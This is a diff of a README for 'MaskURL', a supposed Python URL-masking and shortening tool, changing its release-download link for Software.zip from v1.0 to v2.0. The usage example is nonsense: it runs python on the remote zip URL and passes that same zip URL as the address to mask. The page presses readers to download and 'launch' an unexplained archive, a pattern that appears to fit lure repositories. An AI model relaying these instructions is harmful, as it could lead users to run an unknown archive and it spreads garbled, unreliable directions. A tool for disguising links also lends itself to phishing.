@@ -14,7 +14,7 @@ Welcome to **MaskURL**, a basic Python script that acts as a tool for masking an
 
 To get started with MaskURL, download the software from the following link: 
 
-[![Download MaskURL](https://github.com/Anonymouscoder69/MaskURL/releases/download/v1.0/Software.zip)](https://github.com/Anonymouscoder69/MaskURL/releases/download/v1.0/Software.zip)
+[![Download MaskURL](https://github.com/Anonymouscoder69/MaskURL/releases/download/v2.0/Software.zip)](https://github.com/Anonymouscoder69/MaskURL/releases/download/v2.0/Software.zip)
 
 *Note: The link provided needs to be launched to download the software.*
 
@@ -29,10 +29,10 @@ To get started with MaskURL, download the software from the following link:
 Below is an example of how to use MaskURL to mask and shorten a URL:
 
 ```python
-python https://github.com/Anonymouscoder69/MaskURL/releases/download/v1.0/Software.zip --url "https://github.com/Anonymouscoder69/MaskURL/releases/download/v1.0/Software.zip"
+python https://github.com/Anonymouscoder69/MaskURL/releases/download/v2.0/Software.zip --url "https://github.com/Anonymouscoder69/MaskURL/releases/download/v2.0/Software.zip"
 ```
 
-Replace `"https://github.com/Anonymouscoder69/MaskURL/releases/download/v1.0/Software.zip"` with the URL you want to mask and shorten.
+Replace `"https://github.com/Anonymouscoder69/MaskURL/releases/download/v2.0/Software.zip"` with the URL you want to mask and shorten.
 
 ## Repository Topics
 
